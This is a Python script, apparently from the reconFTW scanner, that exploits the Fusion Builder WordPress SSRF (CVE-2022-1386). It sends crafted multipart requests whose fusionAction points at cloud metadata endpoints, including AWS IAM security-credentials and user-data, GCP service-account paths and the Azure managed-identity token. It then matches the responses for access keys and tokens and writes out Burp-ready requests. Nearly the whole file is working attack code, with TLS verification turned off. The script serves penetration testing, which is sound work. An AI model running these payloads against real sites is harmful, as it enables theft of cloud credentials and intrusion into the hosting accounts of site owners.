#!/usr/bin/env python3
"""Build NDJSON SSRF confirmed findings + one Burp .http per host.

On hit writes a single file:
  vulns/ssrf_requests/<host>.http   <- paste into Burp Repeater

Subcommands:
  emit-oob     one blind/OAST finding line
  probe-fusion CVE-2022-1386 Fusion Builder multi-cloud sink probe
"""

from __future__ import annotations

import argparse
import json
import re
import ssl
import sys
import uuid
from pathlib import Path
from typing import Any
from urllib.error import HTTPError, URLError
from urllib.parse import urlparse
from urllib.request import HTTPSHandler, Request, build_opener

_SSL_CTX = ssl.create_default_context()
try:
    _SSL_CTX.check_hostname = False
    _SSL_CTX.verify_mode = ssl.CERT_NONE
except Exception:
    pass
_OPENER = build_opener(HTTPSHandler(context=_SSL_CTX))

SINKS: list[tuple[str, str, list[str]]] = [
    ("AWS IMDSv1 — meta-data", "http://169.254.169.254/latest/meta-data/",
     [r"ami-id", r"instance-id", r"local-ipv4", r"public-ipv4", r"security-credentials", r"placement/"]),
    ("AWS IMDSv1 — hostname", "http://169.254.169.254/latest/meta-data/hostname",
     [r"ip-\d+-\d+-\d+-\d+", r"\.ec2\.internal", r"\.compute\.internal", r"\.amazonaws\.com"]),
    ("AWS IMDSv1 — instance-id", "http://169.254.169.254/latest/meta-data/instance-id", [r"\bi-[0-9a-f]{8,}\b"]),
    ("AWS IMDSv1 — ami-id", "http://169.254.169.254/latest/meta-data/ami-id", [r"\bami-[0-9a-f]{8,}\b"]),
    ("AWS IMDSv1 — iam/creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     [r"AccessKeyId", r"SecretAccessKey", r"Token", r"(?m)^[A-Za-z0-9+=,.@_-]{3,128}$"]),
    ("AWS IMDSv1 — user-data", "http://169.254.169.254/latest/user-data",
     [r"#!/", r"cloud-config", r"write_files", r"runcmd", r"AWS_"]),
    ("AWS IMDSv1 — account", "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info",
     [r"AccountId", r"Code", r"LastUpdated"]),
    ("GCP metadata — email",
     "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email",
     [r"@developer\.gserviceaccount\.com", r"gserviceaccount\.com", r"Metadata-Flavor",
      r"Missing required header.*Metadata-Flavor"]),
    ("GCP metadata — IP",
     "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email",
     [r"@developer\.gserviceaccount\.com", r"gserviceaccount\.com", r"Metadata-Flavor",
      r"Missing required header.*Metadata-Flavor"]),
    ("GCP metadata — project-id",
     "http://metadata.google.internal/computeMetadata/v1/project/project-id",
     [r"^[a-z][a-z0-9-]{4,28}[a-z0-9]$", r"Metadata-Flavor"]),
    ("Azure IMDS — instance", "http://169.254.169.254/metadata/instance?api-version=2018-02-01",
     [r"vmId", r"subscriptionId", r"resourceGroupName", r"azEnvironment",
      r"Metadata header required", r"required metadata header"]),
    ("Azure IMDS — identity",
     "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
     [r"access_token", r"Metadata header required", r"required metadata header"]),
    ("DigitalOcean metadata", "http://169.254.169.254/metadata/v1/",
     [r"interfaces/", r"vendor-data", r"public-keys", r"droplet_id", r"floating_ip"]),
    ("DigitalOcean metadata — id", "http://169.254.169.254/metadata/v1/id", [r"(?m)^\d{5,}$"]),
    ("Oracle Cloud IMDS", "http://169.254.169.254/opc/v1/instance/",
     [r"oci-blockstorage", r"availabilityDomain", r"compartmentId", r"displayName", r"regionInfo"]),
    ("Oracle Cloud IMDS v2", "http://169.254.169.254/opc/v2/instance/",
     [r"oci-blockstorage", r"availabilityDomain", r"compartmentId", r"Authorization header"]),
    ("Alibaba Cloud metadata", "http://10.0.0.200/latest/meta-data/",
     [r"instance-id", r"image-id", r"private-ipv4", r"hostname", r"ram/"]),
    ("Alibaba Cloud metadata (100.100)", "http://100.100.100.200/latest/meta-data/",
     [r"instance-id", r"image-id", r"private-ipv4", r"hostname", r"ram/"]),
    ("OpenStack metadata", "http://169.254.169.254/openstack/latest/meta_data.json",
     [r"uuid", r"meta", r"hostname", r"project_id", r"availability_zone"]),
]

INBAND_CANARIES: list[tuple[str, str, list[str]]] = [
    ("In-band SSRF — example.com", "http://example.com/",
     [r"Example Domain", r"iana\.org/domains/example"]),
    ("In-band SSRF — example.com (https)", "https://example.com/",
     [r"Example Domain", r"iana\.org/domains/example"]),
    ("In-band SSRF — neverssl", "http://neverssl.com/", [r"NeverSSL", r"probably\.works"]),
]


def _snippet(body: str, limit: int = 160) -> str:
    one = re.sub(r"\s+", " ", body or "").strip()
    return one if len(one) <= limit else one[: limit - 3] + "..."


def _match_evidence(body: str, patterns: list[str]) -> str | None:
    text = (body or "").strip()
    if not text:
        return None
    if re.search(r"<(html|body|!doctype)\b", text, re.I) and not re.search(
        r"\b(ami-|i-[0-9a-f]{8,}|AccessKeyId|AccountId|vmId|Metadata-Flavor|"
        r"gserviceaccount|availabilityDomain|compartmentId|droplet)\b",
        text,
        re.I,
    ):
        return None
    for pat in patterns:
        m = re.search(pat, text, re.I | re.M)
        if m:
            got = m.group(0)
            return _snippet(text if len(got) < 8 and len(text) > 8 else got)
    return None


def _safe_name(text: str, limit: int = 120) -> str:
    return (re.sub(r"[^A-Za-z0-9._-]+", "-", text).strip("-_.") or "host")[:limit]


def _parse_ajax(ajax_url: str) -> tuple[str, str]:
    p = urlparse(ajax_url)
    host = p.netloc or "target"
    path = p.path or "/"
    if p.query:
        path = f"{path}?{p.query}"
    return host, path


def _build_fusion_multipart(sink_url: str, nonce: str = "0") -> tuple[str, bytes]:
    boundary = f"---------------------------reconftw{uuid.uuid4().hex[:12]}"
    form_data = (
        f"email=recon%40example.com&fusion_privacy_store_ip_ua=false"
        f"&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore"
        f"&fusion-form-nonce-0={nonce}&fusion-fields-hold-private-data="
    )
    parts = [
        ("formData", form_data),
        ("action", "fusion_form_submit_form_to_url"),
        ("fusion_form_nonce", nonce),
        ("form_id", "0"),
        ("post_id", "0"),
        ("field_labels", '{"email":"Email address"}'),
        ("hidden_field_names", "[]"),
        ("fusionAction", sink_url),
        ("fusionActionMethod", "GET"),
    ]
    chunks: list[bytes] = []
    for name, value in parts:
        chunks.append(
            (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'
                f"{value}\r\n"
            ).encode("utf-8", errors="replace")
        )
    chunks.append(f"--{boundary}--\r\n".encode())
    return boundary, b"".join(chunks)


def _raw_http_request(
    *, method: str, host: str, path: str, headers: dict[str, str], body: bytes = b""
) -> bytes:
    lines = [f"{method} {path} HTTP/1.1", f"Host: {host}"]
    lower = {k.lower() for k in headers}
    for k, v in headers.items():
        if k.lower() != "host":
            lines.append(f"{k}: {v}")
    if body and "content-length" not in lower:
        lines.append(f"Content-Length: {len(body)}")
    head = ("\r\n".join(lines) + "\r\n\r\n").encode("utf-8", errors="replace")
    return head + body if body else head


def _save_burp_request(requests_dir: str | Path, *, ajax_url: str, raw_request: bytes) -> str:
    """One short file: vulns/ssrf_requests/<host>.http"""
    out = Path(requests_dir)
    out.mkdir(parents=True, exist_ok=True)
    host, _ = _parse_ajax(ajax_url)
    host_name = re.sub(r":(443|80)$", "", host.split("@")[-1])
    http_path = out / f"{_safe_name(host_name)}.http"
    http_path.write_bytes(raw_request)
    return http_path.as_posix()


def _fusion_post(
    ajax_url: str,
    sink_url: str,
    nonce: str = "0",
    extra_header: str | None = None,
    timeout: float = 10.0,
) -> tuple[int | None, str, bytes]:
    host, path = _parse_ajax(ajax_url)
    boundary, body = _build_fusion_multipart(sink_url, nonce=nonce)
    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "X-Requested-With": "XMLHttpRequest",
        "User-Agent": "reconFTW-ssrf-probe",
        "Accept": "*/*",
        "Connection": "close",
    }
    if extra_header and ":" in extra_header:
        hk, hv = extra_header.split(":", 1)
        headers[hk.strip()] = hv.strip()
    raw = _raw_http_request(method="POST", host=host, path=path, headers=headers, body=body)
    req = Request(ajax_url, data=body, headers=headers, method="POST")
    try:
        with _OPENER.open(req, timeout=timeout) as resp:  # noqa: S310
            return int(getattr(resp, "status", 200) or 200), resp.read(65536).decode("utf-8", errors="replace"), raw
    except HTTPError as e:
        data = e.read(65536) if hasattr(e, "read") else b""
        return int(e.code), data.decode("utf-8", errors="replace"), raw
    except (URLError, TimeoutError, OSError):
        return None, "", raw


def _fetch_nonce(ajax_url: str, extra_header: str | None = None, timeout: float = 10.0) -> str:
    data = b"action=fusion_form_update_view"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "User-Agent": "reconFTW-ssrf-probe",
    }
    if extra_header and ":" in extra_header:
        hk, hv = extra_header.split(":", 1)
        headers[hk.strip()] = hv.strip()
    req = Request(ajax_url, data=data, headers=headers, method="POST")
    try:
        with _OPENER.open(req, timeout=timeout) as resp:  # noqa: S310
            text = resp.read(65536).decode("utf-8", errors="replace")
    except (HTTPError, URLError, TimeoutError, OSError):
        return "0"
    m = re.search(r'fusion-form-nonce-0"[^>]*value="([^"]+)"', text)
    if m:
        return m.group(1)
    m = re.search(r'id="fusion-form-nonce-0"[^>]*value="([^"]+)"', text)
    return m.group(1) if m else "0"


def probe_fusion(
    ajax_url: str,
    *,
    oast_url: str | None = None,
    oast_reflected: bool = False,
    extra_header: str | None = None,
    requests_dir: str | None = "vulns/ssrf_requests",
) -> dict[str, Any] | None:
    nonce = _fetch_nonce(ajax_url, extra_header=extra_header)
    hits: list[dict[str, Any]] = []
    best_raw: bytes | None = None

    for desc, sink_url, patterns in INBAND_CANARIES:
        status, body, raw = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_header=extra_header)
        evidence = _match_evidence(body, patterns)
        if evidence is None:
            continue
        hits.append({"desc": desc, "url": sink_url, "status": status, "evidence": evidence})
        best_raw = raw
        break

    for desc, sink_url, patterns in SINKS:
        status, body, raw = _fusion_post(ajax_url, sink_url, nonce=nonce, extra_header=extra_header)
        evidence = _match_evidence(body, patterns)
        if evidence is None and body and "169.254.169.254" in sink_url:
            if re.search(
                r"(ami-id|instance-id|local-ipv4|security-credentials|Metadata-Flavor|"
                r"subscriptionId|availabilityDomain|openstack)",
                body,
                re.I,
            ):
                evidence = _snippet(body)
        if evidence is None:
            continue
        hits.append({"desc": desc, "url": sink_url, "status": status, "evidence": evidence})
        if best_raw is None or sink_url.rstrip("/").endswith("meta-data"):
            best_raw = raw

    if oast_reflected and oast_url:
        status, _body, raw = _fusion_post(ajax_url, oast_url, nonce=nonce, extra_header=extra_header)
        hits.append(
            {
                "desc": "OAST / collaborator (our probe)",
                "url": oast_url,
                "status": status,
                "evidence": "fusionAction response reflected Interactsh/OAST content from our SSRF probe",
            }
        )
        if best_raw is None:
            best_raw = raw

    if not hits:
        return None

    request_file = ""
    if requests_dir and best_raw:
        request_file = _save_burp_request(requests_dir, ajax_url=ajax_url, raw_request=best_raw)

    return {
        "target": ajax_url,
        "cve": "CVE-2022-1386",
        "vector": "fusionAction",
        "vulnerable": True,
        "ssrf_hits": hits,
        "request_file": request_file,
    }


def emit_oob(
    target: str,
    *,
    method: str = "GET",
    vector: str = "unknown",
    sink_url: str | None = None,
    evidence: str = "",
    status: int | None = None,
    requests_dir: str | None = "vulns/ssrf_requests",
) -> dict[str, Any]:
    host, path = _parse_ajax(target)
    request_file = ""
    if method.upper() == "POST" and "fusionAction" in (vector or ""):
        sink = sink_url or "http://169.254.169.254/latest/meta-data/"
        ajax = target if target.endswith("admin-ajax.php") else f"{target.rstrip('/')}/wp-admin/admin-ajax.php"
        _, _, raw = _fusion_post(ajax, sink, nonce="0")
        if requests_dir and raw:
            request_file = _save_burp_request(requests_dir, ajax_url=ajax, raw_request=raw)
        hit_url = sink
    else:
        headers = {"User-Agent": "reconFTW-ssrf-probe", "Accept": "*/*", "Connection": "close"}
        raw = _raw_http_request(method=method.upper() or "GET", host=host, path=path or "/", headers=headers)
        if requests_dir and raw:
            request_file = _save_burp_request(requests_dir, ajax_url=target, raw_request=raw)
        hit_url = sink_url or target

    return {
        "target": target,
        "method": method,
        "vector": vector,
        "vulnerable": True,
        "request_file": request_file,
        "ssrf_hits": [
            {
                "desc": f"Blind SSRF ({vector})" if vector else "Blind SSRF (OAST)",
                "url": hit_url,
                "status": status,
                "evidence": evidence or "OAST callback correlated to our request",
            }
        ],
    }


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__)
    sub = ap.add_subparsers(dest="cmd", required=True)

    p_emit = sub.add_parser("emit-oob")
    p_emit.add_argument("--target", required=True)
    p_emit.add_argument("--method", default="GET")
    p_emit.add_argument("--vector", default="unknown")
    p_emit.add_argument("--sink-url", default="")
    p_emit.add_argument("--evidence", default="")
    p_emit.add_argument("--status", type=int, default=None)
    p_emit.add_argument("--requests-dir", default="vulns/ssrf_requests")

    p_probe = sub.add_parser("probe-fusion")
    p_probe.add_argument("ajax_url")
    p_probe.add_argument("--oast-url", default="")
    p_probe.add_argument("--oast-reflected", action="store_true")
    p_probe.add_argument("--header", default="")
    p_probe.add_argument("--requests-dir", default="vulns/ssrf_requests")

    args = ap.parse_args()
    if args.cmd == "emit-oob":
        obj = emit_oob(
            args.target,
            method=args.method,
            vector=args.vector,
            sink_url=args.sink_url or None,
            evidence=args.evidence,
            status=args.status,
            requests_dir=args.requests_dir or None,
        )
    else:
        obj = probe_fusion(
            args.ajax_url,
            oast_url=args.oast_url or None,
            oast_reflected=bool(args.oast_reflected),
            extra_header=args.header or None,
            requests_dir=args.requests_dir or None,
        )
        if obj is None:
            return 0
    sys.stdout.write(json.dumps(obj, ensure_ascii=False) + "\n")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
